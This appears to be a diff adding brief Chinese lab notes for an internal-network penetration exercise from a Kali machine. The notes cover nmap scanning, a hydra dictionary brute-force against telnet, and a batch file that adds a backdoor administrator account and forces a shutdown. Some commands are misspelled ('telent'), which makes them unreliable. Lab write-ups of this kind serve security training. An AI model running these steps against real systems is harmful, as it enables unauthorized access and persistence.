@@ -1,0 +1,27 @@
+内网渗透实验
+攻击机kali：192.168.241.140
+
+ip address 确认自身ip地址
+
+nmap -sP 192.168.241.0/24 发掘网段内存活主机(这里建议使用 -p0 可以绕过某些防火墙)
+
+nmap -sV 192.168.241.130 扫描此地址端口 (建议加 -Pn 不使用ping)
+
+ping 192.168.241.130 判断连通性
+
+telent 192.168.241.130 试着连接主机
+
+hydra 192.168.241.130 -L user.txt -P pwd.txt telent 双字典爆破
+
+whoami
+
+net user //查询存在用户名
+
+copy con c:\123.bat
+ >>net user qq 111 /add
+ >>net localgroup administrator qq /add
+ >>shutdown -s -t 40 -c "1111"
+ctrl+z
+
+net user 发现增加用户名qq
+
